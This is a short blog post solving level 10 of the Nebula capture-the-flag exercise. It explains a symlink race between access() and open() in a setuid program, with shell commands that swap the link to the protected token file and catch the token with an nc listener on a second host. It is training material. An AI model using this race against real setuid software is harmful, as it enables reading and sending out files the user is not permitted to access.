---
date: '2012-02-01T06:52:25+10:00'
draft: false
title: 'Nebula Level10 Solution'
tags: ['nebula', 'ctf', 'solution']
---

This solution leverages a discrepancy in how file permissions are checked versus how files are opened. The program uses the calling process's real UID and GID to perform an access() check, while the open() system call uses the effective IDs. This allows an attacker to exploit the timing difference by altering a symbolic link at an opportune moment.

## Exploit Details

When the check passes:
```c
if(access(argv[1], ROK) == 0) {
```
the program subsequently performs open() and read() operations. By initially creating a symbolic link to a readable file and then switching it to the protected `/home/flag10/token` file after passing the check, the content of the token file can be accessed.

## Step-by-Step Instructions

1. **Create the initial symbolic link**
   Link a random readable file (e.g.):
   ```bash
   ln -s ~/readable ~/pi3ch
   ```

2. **Run the exploit program**
   Execute `flag10` in the background by providing the symbolic link and the IP of the other host:
   ```bash
   ./flag10 ~/pi3ch OTHERHOSTIPADDRESS &
   ```

3. **Swap the symbolic link**
   After the access check, remove the current link and create a new one pointing to the token file:
   ```bash
   rm ~/pi3ch
   ln -s /home/flag10/token ~/pi3ch
   ```

4. **Listen for the connection**
   On a second host, listen to incoming connections on port 18211:
   ```bash
   nc -vvvv -n -l -p 18211
   ```

5. **Retrieve the token**
   Wait until you see the token (e.g. `615a2ce1-b2b5-4c76-8eed-8aa5c4015c27`), and the level is solved.

## Additional Information

A detailed alternative solution can be found at:
[Exploit Exercises Nebula10 Alternative](http://www.mattandreko.com/2011/12/exploit-exercises-nebula-10.html)
